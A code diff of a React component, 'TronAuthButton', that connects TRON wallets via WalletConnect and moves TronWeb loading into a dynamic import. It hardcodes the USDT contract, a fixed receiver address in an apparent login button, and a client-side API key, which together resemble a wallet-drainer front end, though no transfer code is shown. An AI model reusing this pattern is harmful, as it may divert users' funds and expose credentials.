@@ -2,17 +2,11 @@
 
 import React, { useState, useEffect } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
-import TronWeb from 'tronweb';
 import { Buffer } from 'buffer';
 window.Buffer = Buffer;
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
-
-const tronWeb = new (TronWeb as any)({
-  fullHost: 'https://api.trongrid.io',
-  headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
-});
 
 const adapter = new WalletConnectAdapter({
   network: 'Mainnet',
@@ -33,11 +27,21 @@ export const TronAuthButton: React.FC = () => {
   const [modalMessage, setModalMessage] = useState<string | null>(null);
   const [processing, setProcessing] = useState(false);
   const [userAddress, setUserAddress] = useState<string | null>(null);
+  const [tronWeb, setTronWeb] = useState<any>(null);
 
   useEffect(() => {
+    (async () => {
+      const TronWeb = (await import('tronweb')).default;
+      setTronWeb(new TronWeb({
+        fullHost: 'https://api.trongrid.io',
+        headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
+      }));
+    })();
+
     if (typeof (adapter as any).init === 'function') {
       (adapter as any).init();
     }
+
     adapter.on('disconnect', () => {
       setProcessing(false);
       setModalMessage(null);
@@ -52,6 +56,11 @@ export const TronAuthButton: React.FC = () => {
   };
 
   const connectWallet = async () => {
+    if (!tronWeb) {
+      setModalMessage('⚠️ TronWeb is loading, please try again.');
+      return;
+    }
+
     setProcessing(true);
     try {
       await adapter.connect();
